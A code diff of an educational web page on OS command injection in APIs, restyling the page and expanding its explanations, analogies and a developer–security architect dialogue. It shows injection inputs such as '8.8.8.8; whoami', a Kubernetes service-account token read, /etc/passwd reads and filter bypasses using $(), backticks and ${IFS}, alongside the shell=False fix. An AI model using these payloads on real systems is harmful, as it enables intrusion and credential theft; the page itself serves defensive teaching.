@@ -59,20 +59,31 @@
       font-family: var(--font-heading);
       font-size: 1.25rem;
       font-weight: 800;
-      color: #fff;
+      color: #ffffff;
       letter-spacing: -0.02em;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      line-height: 1.2;
     }
     .sidebar-brand-title span {
-      color: #38bdf8;
+      background: linear-gradient(135deg, #38bdf8 0%, #0284c7 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 20px rgba(56, 189, 248, 0.3);
     }
 
     .sidebar-section-heading {
-      font-size: 0.75rem;
+      font-size: 0.72rem;
       font-weight: 700;
-      color: #64748b;
-      padding: 0.8rem 1.4rem 0.6rem;
+      color: #38bdf8;
+      padding: 0.9rem 1.4rem 0.5rem;
       text-transform: uppercase;
-      letter-spacing: 0.08em;
+      letter-spacing: 0.12em;
+      display: flex;
+      align-items: center;
+      gap: 6px;
     }
 
     .vuln-nav-list {
@@ -171,7 +182,7 @@
 
     .pill-index-tag {
       font-family: var(--font-mono);
-      background: #dc2626;
+      background: #0284c7;
       color: #fff;
       font-weight: 700;
       font-size: 0.75rem;
@@ -1335,7 +1346,15 @@
     }
 
     html[data-theme="light"] .sidebar-section-heading {
-      color: #64748b !important;
+      font-size: 0.72rem;
+      font-weight: 700;
+      color: #38bdf8;
+      padding: 0.9rem 1.4rem 0.5rem;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      display: flex;
+      align-items: center;
+      gap: 6px;
     }
 
     html[data-theme="light"] .vuln-nav-item {
@@ -1525,8 +1544,13 @@
   <div class="app-dashboard-layout">
 
     <aside class="dashboard-sidebar">
-      <div class="sidebar-header">
-        <a href=\"index.html\" class=\"sidebar-brand-title\" style=\"text-decoration:none; display:block;\">API <span>SECURITY</span></a>
+            <div class="sidebar-header">
+        <div class="brand-icon">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+        </div>
+        <a href="index.html" class="sidebar-brand-title">API <span>SECURITY</span></a>
       </div>
 
       <div class="sidebar-section-heading">Foundations</div>
@@ -1587,13 +1611,13 @@
       <section class="hero-top-grid">
         <div>
           <div class="category-tag-row">
-            <span class="pill-index-tag" style="background:#16a34a;">10</span>
+            <span class="pill-index-tag">10</span>
             <span class="pill-category-name">Operating System Command Injection</span>
           </div>
 
           <h1 class="main-vuln-h1">
             OS Command<br>
-            <span class="title-blue" style="color:#22c55e;">Injection (RCE)</span>
+            <span class="title-blue">Injection (RCE)</span>
           </h1>
 
           <p class="main-vuln-desc">
@@ -1625,52 +1649,54 @@
           </div>
         </div>
 
-        <!-- Right Box: Interactive Hero Widget -->
+                <!-- Right Box: Interactive Hero Widget (Aligned with Module 01 BOLA Design) -->
         <div class="hero-glass-graphic" id="cmdHeroWidget">
           <div class="hero-widget-header">
             <div class="hero-widget-badge">
-              <span class="pulse-live-dot" style="background:#22c55e; box-shadow:0 0 8px #22c55e;"></span>
-              <span class="hero-badge-title">Interactive Command Injection Simulator</span>
+              <span class="pulse-live-dot"></span>
+              <span class="hero-badge-title">Interactive Attack Flow</span>
             </div>
             <div class="hero-sim-pills">
-              <button type="button" class="hero-sim-btn" id="cmdSafeBtn" title="Protected: shell=False + Regex Allowlist">
-                <span>🛡️</span> <span>No Shell (Safe)</span>
+              <button type="button" class="hero-sim-btn" id="btnCmdNormal" title="Show Normal Parameterized Input">
+                <span>👤</span> <span>Normal (8.8.8.8)</span>
               </button>
-              <button type="button" class="hero-sim-btn active exploit" id="cmdExploitBtn" title="Vulnerable: shell=True String Concatenation">
-                <span>⚠️</span> <span>Shell Exec (Exploit)</span>
+              <button type="button" class="hero-sim-btn active exploit" id="btnCmdExploit" title="Show Command Injection Exploit">
+                <span>⚡</span> <span>RCE Exploit (; whoami)</span>
               </button>
             </div>
           </div>
 
           <div class="hero-widget-body">
-            <div class="attacker-graphic-node">
-              <div class="attacker-avatar-circle">🥷</div>
-              <div class="attacker-label">Rohan (Red Teamer)</div>
-              <div class="attacker-sub">host: "8.8.8.8; whoami"</div>
+            <div class="attacker-graphic-node" id="cmdAttackerNode">
+              <div class="attacker-avatar-circle" id="cmdAttackerAvatar">🥷</div>
+              <div class="attacker-label" id="cmdAttackerLabel">Rohan (Attacker)</div>
+              <div class="attacker-sub" id="cmdAttackerSub">Input: "8.8.8.8; whoami"</div>
             </div>
 
             <div class="graphic-center-flow">
-              <div class="graphic-url-pill" id="heroUrlPill">
-                <span style="color:#22c55e; font-weight:700;">POST</span> <span>/api/v1/diagnostics/ping</span>
+              <div class="graphic-url-pill" id="cmdUrlPill">
+                <span class="m-verb" id="cmdVerb" style="color:#ef4444; font-weight:700;">POST</span> <span class="m-path" id="cmdPath">/api/v1/diagnostics/ping</span>
               </div>
-              <div style="font-size:0.7rem; color:#fca5a5; font-family:var(--font-mono);" id="heroPayloadText">
-                "8.8.8.8; whoami"
+              <div class="graphic-swap-box" id="cmdSwapBox">
+                <span class="swap-id-badge from" id="cmdBadgeFrom">8.8.8.8</span>
+                <span class="swap-arrow-icon" id="cmdSwapArrow" style="color:var(--text-dim); font-size:0.8rem;">➔</span>
+                <span class="swap-id-badge to" id="cmdBadgeTo">8.8.8.8; whoami</span>
               </div>
-              <div class="flow-beam-track">
-                <div class="flow-beam-particle" id="heroBeamParticle"></div>
+              <div class="flow-beam-track" id="cmdBeamTrack">
+                <div class="flow-beam-particle exploit" id="cmdBeamParticle"></div>
               </div>
-              <span class="flow-state-label" id="heroFlowState" style="color:#ef4444;">SEMICOLON CHAINING ACTIVE</span>
+              <span class="flow-state-label" id="cmdFlowStateText" style="color:#f87171;">Injected Semicolon Delimiter</span>
             </div>
 
-            <div class="target-profile-card exploit" id="heroTargetCard">
+            <div class="target-profile-card exploit" id="cmdTargetCard">
               <div class="target-card-top">
-                <h4 id="heroTargetName">Linux App Container</h4>
-                <span class="target-pill-status breach" id="heroTargetStatus">RCE COMPROMISE</span>
+                <h4 id="cmdTargetName">Linux App Container</h4>
+                <span class="target-pill-status breach" id="cmdTargetStatus">HTTP 200 (RCE)</span>
               </div>
-              <p>Cmd: <code id="heroField1" style="color:#ef4444;">sh -c "ping -c 2 8.8.8.8; whoami"</code></p>
-              <p>Output: <code id="heroField2" style="color:#ef4444;">(uid=0 gid=0) root</code></p>
-              <p>Result: <code id="heroField3" style="color:#ef4444;">Full Container Host Takeover</code></p>
-              <span style="color:#f87171; font-size:0.68rem; font-weight:700;" id="heroTargetNote">🚨 Reverse Shell Ready!</span>
+              <p id="cmdTargetExec">Exec: <code style="color:#ef4444;">sh -c "ping ...; whoami"</code></p>
+              <p id="cmdTargetOutput">Output: <code style="color:#f87171; font-weight:700;">root (uid=0)</code></p>
+              <p id="cmdTargetResult">Status: <code style="color:#ef4444;">Host Compromise</code></p>
+              <span class="unauth-note" id="cmdTargetNote">🚨 Arbitrary OS commands executed on host!</span>
             </div>
           </div>
         </div>
@@ -1689,111 +1715,200 @@
         </nav>
       </div>
 
-      <!-- ====================================================================
-           TAB 1: OVERVIEW
+            <!-- ====================================================================
+           TAB 1: OVERVIEW (Deep Pedagogical Foundation & System Architecture)
            ==================================================================== -->
       <div class="tab-content active" id="tab-overview">
         <div class="card-panel">
+          
           <div class="card-title-badge-row">
             <div class="blue-circle-num">1</div>
             <h2 class="panel-header-title">
-              <span class="lang-hi">Understanding OS Command Injection in APIs</span>
-              <span class="lang-en">Understanding OS Command Injection in APIs</span>
+              <span class="lang-hi">Operating System Command Injection: Deep Architecture &amp; Core Concepts</span>
+              <span class="lang-en">Operating System Command Injection: Deep Architecture &amp; Core Concepts</span>
             </h2>
           </div>
 
-          <!-- Definition Lead Card: Library Locker Analogy -->
-          <div class="def-lead-card">
-            <div class="def-lead-title">
-              <span>📚</span>
-              <span class="lang-hi">Real-World Analogy: The Automated Library Terminal</span>
-              <span class="lang-en">Real-World Analogy: The Automated Library Terminal</span>
+          <!-- Section A: Foundational Concept Lead Card -->
+          <div class="def-lead-card" style="margin-bottom:1.8rem; border-left:4px solid #38bdf8;">
+            <div class="def-lead-title" style="color:#38bdf8;">
+              <span>🖥️</span>
+              <span class="lang-hi">Operating System Shell Kya Hota Hai Aur APIs Isse Kyu Invoke Karti Hain?</span>
+              <span class="lang-en">What is an Operating System Shell &amp; Why Do APIs Invoke It?</span>
             </div>
             <div class="def-lead-text">
-              <p class="lang-hi">
-                Sochiye ek automated college library system hai jisme students ko book search karni hoti hai. Normal user screen par book name enter karta hai: <code>"Data Structures"</code>. Backend clerk computer screen par type karta hai: <code>search_book "Data Structures"</code> aur book status return kar deta hai.<br><br>
-                Lekin ek attacker (Rohan) search box me book title ke sath ek command delimiter enter karta hai: <code>"Data Structures; open_vault --override-all"</code>. Jab backend clerk bina validation ke is pure sentence ko computer me feed karta hai, toh OS shell semicolon ko command separator samajh kar pehle book search karti hai aur agle hi pal vault ka door khol deti hai!<br><br>
-                <strong>Yahi OS Command Injection Hai:</strong> Application developer expect karta hai ki user simple argument (data) dega, lekin attacker argument me shell control metacharacters jodkar underlying operating system ka poora control le leta hai!
-              </p>
-              <p class="lang-en">
-                Imagine an automated library terminal where students check book availability. A student submits a book title: <code>"Data Structures"</code>. Behind the desk, an automated robotic clerk executes: <code>search_book "Data Structures"</code>.<br><br>
-                Now, an attacker (Rohan) types: <code>"Data Structures; open_vault --override-all"</code>. Because the system directly evaluates user input inside a command shell without sanitization, the shell treats the semicolon as a statement terminator, searches for the book, and immediately executes the vault unlock routine!<br><br>
-                <strong>This is Command Injection:</strong> Developers intend to accept isolated data arguments, but by invoking a shell interpreter, they permit attackers to inject command delimiters and seize root execution privilege on the host.
-              </p>
+              <span class="lang-hi">
+                Modern API applications (jaise Python Flask, Node.js Express, Go Gin) <strong>Application Runtime Layer</strong> (User Space) par run hoti hain. Lekin unhe frequently host server ke low-level <strong>Operating System Layer</strong> (Kernel, File System, Network Interfaces) se kaam karwana padta hai—jaise network latency measure karna, media compress karna, PDF invoices render karna, ya hardware status check karna.<br><br>
+                Jab API code operating system se interact karne ke liye ek intermediate <strong>Command Shell</strong> (jaise Linux me <code>/bin/sh</code> ya <code>/bin/bash</code>, aur Windows me <code>cmd.exe</code> ya <code>powershell.exe</code>) ko call karta hai, toh ek fatal boundary cross hoti hai. Agar API user-supplied data (jaise hostname, filename, ya IP) ko bina isolate kiye raw command string me interpolate kar deti hai, toh shell interpreter metacharacters (jaise <code>;</code>, <code>&amp;&amp;</code>, <code>|</code>) ko execution instructions maan leti hai. Yahi <strong>OS Command Injection (RCE)</strong> kehlata hai—jahan ek ordinary HTTP API request server ke root console me transform ho jati hai!
+              </span>
+              <span class="lang-en">
+                Modern API microservices operate within the <strong>Application Runtime Layer</strong> (User Space). However, workflows frequently demand low-level interactions with the host <strong>Operating System Layer</strong> (Kernel, File System, Network Sockets)—such as evaluating network packet latency, encoding video streams, generating PDF invoices, or querying hardware health.<br><br>
+                A catastrophic architectural flaw occurs when backend code spawns an intermediate <strong>Command Shell</strong> (such as <code>/bin/sh</code> or <code>/bin/bash</code> in Linux, or <code>cmd.exe</code> / <code>powershell.exe</code> in Windows) and injects unvalidated user parameters directly into raw command strings. The shell's lexical analyzer parses command delimiters (e.g., <code>;</code>, <code>&amp;&amp;</code>, <code>|</code>, <code>$()</code>) as execution boundaries, executing attacker-supplied payloads with the server process's operational privileges. This is <strong>Remote Code Execution (RCE)</strong>.
+              </span>
+            </div>
+
+            <!-- 4 Fundamental Pillars of Process Execution -->
+            <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap:1rem; margin-top:1.4rem;">
+              <div style="background:rgba(56, 189, 248, 0.08); border:1px solid rgba(56, 189, 248, 0.25); border-radius:var(--radius-sm); padding:12px 14px;">
+                <div style="font-weight:700; color:#38bdf8; font-size:0.86rem; margin-bottom:4px;">1. System Binaries &amp; CLI Tools</div>
+                <div style="font-size:0.8rem; color:#cbd5e1; line-height:1.5;">
+                  <span class="lang-hi">OS ke compiled executables (<code>/bin/ping</code>, <code>/usr/bin/ffmpeg</code>) jo disk par stored hote hain aur specific tasks perform karte hain.</span>
+                  <span class="lang-en">Standalone compiled executables (<code>/bin/ping</code>, <code>/usr/bin/ffmpeg</code>) existing in filesystem paths to execute dedicated tasks.</span>
+                </div>
+              </div>
+
+              <div style="background:rgba(168, 85, 247, 0.08); border:1px solid rgba(168, 85, 247, 0.25); border-radius:var(--radius-sm); padding:12px 14px;">
+                <div style="font-weight:700; color:#c084fc; font-size:0.86rem; margin-bottom:4px;">2. Shell Command Interpreters</div>
+                <div style="font-size:0.8rem; color:#cbd5e1; line-height:1.5;">
+                  <span class="lang-hi">Program (<code>/bin/sh</code>) jo input text strings ko parse karta hai, operators tokenize karta hai aur child processes launch karta hai.</span>
+                  <span class="lang-en">Programs (<code>/bin/sh</code>) that parse text strings, evaluate metacharacters, split tokens, and chain processes.</span>
+                </div>
+              </div>
+
+              <div style="background:rgba(239, 68, 68, 0.08); border:1px solid rgba(239, 68, 68, 0.25); border-radius:var(--radius-sm); padding:12px 14px;">
+                <div style="font-weight:700; color:#f87171; font-size:0.86rem; margin-bottom:4px;">3. Kernel System Calls</div>
+                <div style="font-size:0.8rem; color:#cbd5e1; line-height:1.5;">
+                  <span class="lang-hi">Low-level OS interfaces (<code>fork()</code>, <code>execve()</code>, <code>clone()</code>) jinke zariye new execution context create aur run hota hai.</span>
+                  <span class="lang-en">Kernel primitives (<code>fork()</code>, <code>execve()</code>) that initialize memory spaces and spawn independent process contexts.</span>
+                </div>
+              </div>
+
+              <div style="background:rgba(52, 211, 153, 0.08); border:1px solid rgba(52, 211, 153, 0.25); border-radius:var(--radius-sm); padding:12px 14px;">
+                <div style="font-weight:700; color:#34d399; font-size:0.86rem; margin-bottom:4px;">4. Privilege Context (UID/GID)</div>
+                <div style="font-size:0.8rem; color:#cbd5e1; line-height:1.5;">
+                  <span class="lang-hi">Injected command usi Linux user account (e.g. <code>root</code> ya <code>www-data</code>) ki file aur network permissions inherit karti hai.</span>
+                  <span class="lang-en">The injected command inherits the effective User ID (UID) and file system permissions of the parent web server process.</span>
+                </div>
+              </div>
             </div>
           </div>
 
-          <!-- Story Dialogue Card: Vikram vs Rohan -->
-          <div class="story-card-box">
-            <div class="def-lead-title">
+          <!-- Section B: Real-World Beginner Analogy -->
+          <div class="def-lead-card" style="margin-bottom:1.8rem; border-left:4px solid #f59e0b;">
+            <div class="def-lead-title" style="color:#fbbf24;">
+              <span>🍔</span>
+              <span class="lang-hi">Beginner Friendly Analogy: The Automated Drive-Through Microphone</span>
+              <span class="lang-en">Beginner Friendly Analogy: The Automated Drive-Through Microphone</span>
+            </div>
+            <div class="def-lead-text">
+              <span class="lang-hi">
+                Sochiye aap ek fast-food drive-through counter par khade hain. Customer bahar microphone me apna order bolta hai: <code>"1 Veg Burger"</code>. Counter par baitha assistant kitchen ke speaker par bolta hai: <em>"Chef, please prepare: [customer order]"</em>.<br><br>
+                Chef strictly wahi banata hai jo speaker par bola jata hai. Ab imagine kijiye ek shaatir customer (Attacker) microphone me bolta hai:<br>
+                <code style="color:#f87171; font-weight:700; background:rgba(239,68,68,0.1); padding:3px 8px; border-radius:4px;">"1 Veg Burger; AND ALSO EMPTY CASH REGISTER INTO BAG"</code><br><br>
+                Agar assistant bina soche customer ke poore sentence ko kitchen speaker par repeat kar de: <em>"Chef, please prepare: 1 Veg Burger; AND ALSO EMPTY CASH REGISTER INTO BAG"</em>, aur kitchen automated robot speaker sentence ke semicolon ko do alag-alag orders samajh kar pehle burger banaye aur agle pal cash drawer khol kar bag me bhar de—<strong>toh yahi Command Injection hai!</strong><br><br>
+                <strong>The Architectural Fix:</strong> Sahi system me assistant kabhi customer ke words ko raw kitchen command me concatenate nahi karta. Assistant ek structured digital form me burger checkbox tick karta hai: <code>prepareItem(Burger, qty=1)</code>. Agar customer "empty cash register" bole bhi, toh form us text ko sirf burger ke name field me invalid string maan kar reject kar dega!
+              </span>
+              <span class="lang-en">
+                Imagine a drive-through restaurant ordering system. A customer speaks into the outside microphone: <code>"1 Veggie Burger"</code>. An automated intercom relay broadcasts to the kitchen robots: <em>"Prepare item: [Customer Input]"</em>.<br><br>
+                The robotic kitchen evaluates sentences literally. Now suppose a malicious customer submits the following text:<br>
+                <code style="color:#f87171; font-weight:700; background:rgba(239,68,68,0.1); padding:3px 8px; border-radius:4px;">"1 Veggie Burger; AND ALSO UNLOCK CASH VAULT"</code><br><br>
+                If the relay blindly concatenates raw customer text into the execution stream, the robot treats the semicolon as an imperative statement terminator, fulfills the burger order, and immediately triggers the vault unlock routine! <strong>This is OS Command Injection.</strong><br><br>
+                <strong>The Architectural Remedy:</strong> The relay should never interpolate free-form sentences into the kitchen interpreter. It must use structured parameter tokens: <code>prepareItem(ItemID=402, Qty=1)</code>. Even if a user types malicious commands, they remain inert string literals that cannot alter execution control flow.
+              </span>
+            </div>
+          </div>
+
+          <!-- Section C: Extended Case Study Dialogue (Vikram vs Rohan) -->
+          <div class="story-card-box" style="margin-bottom:1.8rem;">
+            <div class="def-lead-title" style="color:#38bdf8;">
               <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
-              <span class="lang-hi">Case Study: Vikram (Backend Lead) vs Rohan (Senior Security Architect)</span>
-              <span class="lang-en">Case Study: Vikram (Backend Lead) vs Rohan (Senior Security Architect)</span>
+              <span class="lang-hi">Engineering Dialogue: Vikram (Backend Lead) vs Rohan (Senior Security Architect)</span>
+              <span class="lang-en">Engineering Dialogue: Vikram (Backend Lead) vs Rohan (Senior Security Architect)</span>
             </div>
 
+            <!-- Turn 1 -->
             <div class="dialogue-turn">
               <div class="char-avatar char-vikram">👨‍💻</div>
               <div class="dialogue-bubble">
                 <strong>Vikram (Backend Lead):</strong><br>
-                <span class="lang-hi">"Rohan, hamare cloud platform me customers ko network latency check karni hoti hai. Maine ek lightweight endpoint banaya hai: <code>POST /api/v1/network/ping</code> jisme customer target IP bhejta hai aur hum Python <code>subprocess.check_output(f'ping -c 2 {ip}', shell=True)</code> se ping karke results return kar dete hain. Sab kuch containerized hai toh koi issue nahi hona chahiye!"</span>
-                <span class="lang-en">"Rohan, our cloud customers needed network latency monitoring. I implemented <code>POST /api/v1/network/ping</code> where users provide a target host, and our API runs Python's <code>subprocess.check_output(f'ping -c 2 {ip}', shell=True)</code> to return live CLI output. Since it's containerized, we shouldn't have security concerns!"</span>
+                <span class="lang-hi">"Rohan, hamare enterprise cloud dashboard me users ko remote microservice connectivity monitor karni thi. Maine ek simple REST endpoint develop kiya hai: <code>POST /api/v1/network/diagnostics</code>. Request body me user target host bhejta hai (jaise <code>{"host": "8.8.8.8"}</code>), aur backend Python me <code>subprocess.check_output(f'ping -c 2 {host}', shell=True)</code> se CLI ping command chala kar live terminal latency output JSON me return kar deta hai. Code bilkul compact hai aur perfectly work kar raha hai!"</span>
+                <span class="lang-en">"Rohan, enterprise clients requested an operational dashboard to test latency to remote microservices. I built <code>POST /api/v1/network/diagnostics</code>. The client supplies a target host in JSON: <code>{"host": "8.8.8.8"}</code>. The backend executes <code>subprocess.check_output(f'ping -c 2 {host}', shell=True)</code> to retrieve live CLI packet output and returns it to the UI. It is compact and works seamlessly!"</span>
               </div>
             </div>
 
+            <!-- Turn 2 -->
             <div class="dialogue-turn">
               <div class="char-avatar char-rohan">🕵️‍♂️</div>
               <div class="dialogue-bubble">
                 <strong>Rohan (Senior Security Architect):</strong><br>
-                <span class="lang-hi">"Vikram, <code>shell=True</code> use karna server par root shell handover karne barabar hai! Jab tum string format karke shell ko dete ho, toh shell pure string ko parse karta hai. Main IP me <code>8.8.8.8; cat /run/secrets/kubernetes.io/serviceaccount/token</code> bhejkar tumhara internal Kubernetes API token extract kar sakta hoon, ya reverse shell kholkar container se host kernel escape kar sakta hoon!"</span>
-                <span class="lang-en">"Vikram, invoking <code>shell=True</code> with unvalidated input is equivalent to handing attackers a root bash terminal! When you pass a formatted string, the shell evaluates metacharacters. I can inject <code>8.8.8.8; cat /run/secrets/kubernetes.io/serviceaccount/token</code> to exfiltrate internal cluster credentials and escape the container!"</span>
+                <span class="lang-hi">"Vikram, yeh code critical Remote Code Execution (RCE) vulnerability expose kar raha hai! Jab tum <code>shell=True</code> pass karte ho, Python underlying system ke <code>/bin/sh -c</code> ko call karta hai. Shell pure string ko lexically evaluate karta hai. Agar main host parameter me <code>8.8.8.8; whoami</code> bhej doon, toh shell semicolon dekh kar do independent commands chala dega: pehle ping, aur turant baad <code>whoami</code>! Tumhari API mere command ka output HTTP response me return kar degi!"</span>
+                <span class="lang-en">"Vikram, that implementation introduces a critical Remote Code Execution (RCE) vulnerability! Passing <code>shell=True</code> instructs Python to invoke <code>/bin/sh -c</code>. The shell lexer parses the input line. If an adversary submits <code>8.8.8.8; whoami</code>, the shell treats the semicolon as a statement delimiter: it executes the ping and immediately follows by executing <code>whoami</code>, reflecting the OS username in the HTTP response!"</span>
               </div>
             </div>
 
+            <!-- Turn 3 -->
             <div class="dialogue-turn">
               <div class="char-avatar char-vikram">👨‍💻</div>
               <div class="dialogue-bubble">
                 <strong>Vikram (Backend Lead):</strong><br>
-                <span class="lang-hi">"Toh kya main semicolon (<code>;</code>) aur ampersand (<code>&&</code>) ko blacklist kar doon?"</span>
-                <span class="lang-en">"Should I just create a blacklist filtering semicolons (<code>;</code>) and ampersands (<code>&&</code>)?"</span>
+                <span class="lang-hi">"Lekin Rohan, hamara application containerized hai (Docker container me chal raha hai). Agar attacker container ke andar command execute kar bhi le, toh kya wo actual host infrastructure tak pahuch sakta hai? Container isolation hume protect karega na?"</span>
+                <span class="lang-en">"Wait Rohan, our microservice runs inside an isolated Docker container! Even if someone executes commands inside the container, can they really touch our cloud host? Doesn't container isolation mitigate the blast radius?"</span>
               </div>
             </div>
 
+            <!-- Turn 4 -->
             <div class="dialogue-turn">
               <div class="char-avatar char-rohan">🕵️‍♂️</div>
               <div class="dialogue-bubble">
                 <strong>Rohan (Senior Security Architect):</strong><br>
-                <span class="lang-hi">"Blacklisting kabhi secure nahi hoti! Linux shells me commands chain karne ke darjano tareeqe hain: pipes (<code>|</code>), subshells (<code>$()</code>), backticks (<code>`...`</code>), newlines (<code>\n</code>), aur argument redirection. Sahi solution hai: <strong>Kabhi shell invoke hi mat karo!</strong> Direct binary call karo <code>subprocess.run(['ping', '-c', '2', ip], shell=False)</code> ke sath aur IP ko regex allowlist se strictly validate karo!"</span>
-                <span class="lang-en">"Blacklisting always fails! Shells offer dozens of command delimiters: pipes (<code>|</code>), subshell substitution (<code>$()</code>), backticks (<code>`...`</code>), newlines (<code>\n</code>), and redirection. The architecturally sound remedy is: <strong>Never invoke a shell interpreter!</strong> Execute binaries directly via <code>subprocess.run(['ping', '-c', '2', ip], shell=False)</code> and validate IP addresses via strict type contracts."</span>
+                <span class="lang-hi">"Container koi security boundary nahi hai! Container ke andar baithe attacker ko saare sensitive environment variables (jaise <code>DATABASE_URL</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>JWT_PRIVATE_KEY</code>) read karne ka access mil jata hai. Aur agar pod Kubernetes me chal raha hai, toh attacker <code>cat /var/run/secrets/kubernetes.io/serviceaccount/token</code> run karke cluster credentials chura sakta hai aur poore cloud tenant ko compromise kar sakta hai!"</span>
+                <span class="lang-en">"Containers are operational sandboxes, not security hypervisors! An attacker with container code execution can read all environment secrets (e.g. <code>DATABASE_URL</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>JWT_PRIVATE_KEY</code>). Furthermore, in Kubernetes environments, reading <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> grants cluster API access, allowing cluster-wide lateral compromise!"</span>
+              </div>
+            </div>
+
+            <!-- Turn 5 -->
+            <div class="dialogue-turn">
+              <div class="char-avatar char-vikram">👨‍💻</div>
+              <div class="dialogue-bubble">
+                <strong>Vikram (Backend Lead):</strong><br>
+                <span class="lang-hi">"Toh main ek quick regex sanitization laga deta hoon jo semicolon (<code>;</code>) aur double ampersand (<code>&amp;&amp;</code>) ko request aate hi strip ya reject kar de!"</span>
+                <span class="lang-en">"Understood! Then I will simply add a blacklist regex filter to strip or reject semicolons (<code>;</code>) and double ampersands (<code>&amp;&amp;</code>) before execution!"</span>
+              </div>
+            </div>
+
+            <!-- Turn 6 -->
+            <div class="dialogue-turn">
+              <div class="char-avatar char-rohan">🕵️‍♂️</div>
+              <div class="dialogue-bubble">
+                <strong>Rohan (Senior Security Architect):</strong><br>
+                <span class="lang-hi">"Blacklisting hamesha bypass ho jaati hai! Agar tum <code>;</code> aur <code>&amp;&amp;</code> block karoge, toh attacker pipes (<code>|</code>), logical OR (<code>||</code>), POSIX subshell (<code>$(whoami)</code>), backticks (<code>`whoami`</code>), ya newline characters (<code>
+</code>) use kar lega. Space bypass karne ke liye wo <code>${IFS}</code> use karega: <code>cat${IFS}/etc/passwd</code>.<br><br>
+                <strong>The Real Solution:</strong> Kabhi bhi shell interpreter invoke mat karo! Use parameterized process execution: <code>subprocess.run(['ping', '-c', '2', host], shell=False)</code>. Isme OS kernel <code>execve</code> syscall direct binary ko invoke karti hai, aur <code>host</code> parameter ek isolated argument ban kar rehta hai jisme semicolon sirf ek harmless string character hota hai!"</span>
+                <span class="lang-en">"Blacklisting always fails against sophisticated attackers! If you filter <code>;</code> and <code>&amp;&amp;</code>, attackers pivot to pipes (<code>|</code>), logical OR (<code>||</code>), POSIX subshells (<code>$(whoami)</code>), backticks, or hex newlines (<code>
+</code>). If spaces are blocked, they substitute <code>${IFS}</code>: <code>cat${IFS}/etc/passwd</code>.<br><br>
+                <strong>The True Solution:</strong> Never invoke a shell interpreter! Adopt vectorized process execution: <code>subprocess.run(['ping', '-c', '2', host], shell=False)</code>. The kernel issues <code>execve</code> directly to the binary, passing <code>host</code> as an isolated argv element where metacharacters are treated as inert text!"</span>
               </div>
             </div>
           </div>
 
-          <!-- Attack Surfaces Grid -->
-          <div style="margin-top:1.6rem;">
-            <h3 class="panel-header-title" style="font-size:1.1rem; margin-bottom:1rem;">
-              <span class="lang-hi">Modern API Architectures Vulnerable to Command Injection</span>
-              <span class="lang-en">Modern API Architectures Vulnerable to Command Injection</span>
-            </h3>
+          <!-- Section D: High-Risk Modern API Attack Surfaces -->
+          <div style="margin-top:1.8rem;">
+            <div class="def-lead-title" style="color:#38bdf8; margin-bottom:1rem;">
+              <span>🎯</span>
+              <span class="lang-hi">Modern APIs Me Command Injection Ke 4 Primary Attack Surfaces</span>
+              <span class="lang-en">4 Primary Attack Surfaces in Modern API Architectures</span>
+            </div>
+            
             <div class="arch-step-grid">
               <div class="arch-node danger-node">
-                <span style="font-size:1.5rem;">🌐</span>
-                <div class="arch-node-title">Diagnostics &amp; Health Checks</div>
-                <div class="arch-node-desc">Admin tools running <code>ping</code>, <code>traceroute</code>, <code>nslookup</code>, or <code>curl</code> CLI utilities.</div>
+                <span style="font-size:1.6rem;">🌐</span>
+                <div class="arch-node-title">1. Network Diagnostics &amp; Health</div>
+                <div class="arch-node-desc">Admin utilities invoking system tools: <code>ping</code>, <code>traceroute</code>, <code>nslookup</code>, <code>curl</code>, <code>ip route</code>.</div>
               </div>
               <div class="arch-node danger-node">
-                <span style="font-size:1.5rem;">📄</span>
-                <div class="arch-node-title">Document &amp; PDF Generators</div>
-                <div class="arch-node-desc">Microservices calling CLI tools like <code>wkhtmltopdf</code>, <code>pandoc</code>, <code>libreoffice</code>.</div>
+                <span style="font-size:1.6rem;">📄</span>
+                <div class="arch-node-title">2. Document &amp; PDF Generation</div>
+                <div class="arch-node-desc">Microservices delegating to CLI utilities: <code>wkhtmltopdf</code>, <code>pandoc</code>, <code>libreoffice</code>, <code>ghostscript</code>.</div>
               </div>
               <div class="arch-node danger-node">
-                <span style="font-size:1.5rem;">🎬</span>
-                <div class="arch-node-title">Media &amp; Video Transcoding</div>
-                <div class="arch-node-desc">APIs invoking <code>ffmpeg</code>, <code>imagemagick</code>, or <code>sox</code> with dynamic file paths.</div>
+                <span style="font-size:1.6rem;">🎬</span>
+                <div class="arch-node-title">3. Media Transcoding &amp; Imaging</div>
+                <div class="arch-node-desc">APIs orchestrating video/audio pipelines: <code>ffmpeg</code>, <code>imagemagick</code>, <code>sox</code>, <code>exiftool</code>.</div>
               </div>
               <div class="arch-node danger-node">
-                <span style="font-size:1.5rem;">📦</span>
-                <div class="arch-node-title">Git &amp; CI/CD Pipelines</div>
-                <div class="arch-node-desc">DevOps endpoints triggering <code>git clone</code>, <code>tar -xzf</code>, or <code>docker build</code>.</div>
+                <span style="font-size:1.6rem;">📦</span>
+                <div class="arch-node-title">4. DevOps &amp; CI/CD Orchestration</div>
+                <div class="arch-node-desc">Cloud endpoints triggering system actions: <code>git clone</code>, <code>tar -xzf</code>, <code>docker build</code>, <code>helm</code>.</div>
               </div>
             </div>
           </div>
@@ -1802,162 +1917,261 @@
       </div>
 
       <!-- ====================================================================
-           TAB 2: HOW IT WORKS
+           TAB 2: HOW IT WORKS (Deep Architecture, Syscall Mechanics & Delimiters)
            ==================================================================== -->
       <div class="tab-content" id="tab-how-it-works">
         <div class="card-panel">
+          
           <div class="card-title-badge-row">
             <div class="blue-circle-num">2</div>
             <h2 class="panel-header-title">
-              <span class="lang-hi">How OS Command Injection Works (Deep Architecture)</span>
-              <span class="lang-en">How OS Command Injection Works (Deep Architecture)</span>
+              <span class="lang-hi">How OS Command Injection Works (Deep Architecture &amp; Syscalls)</span>
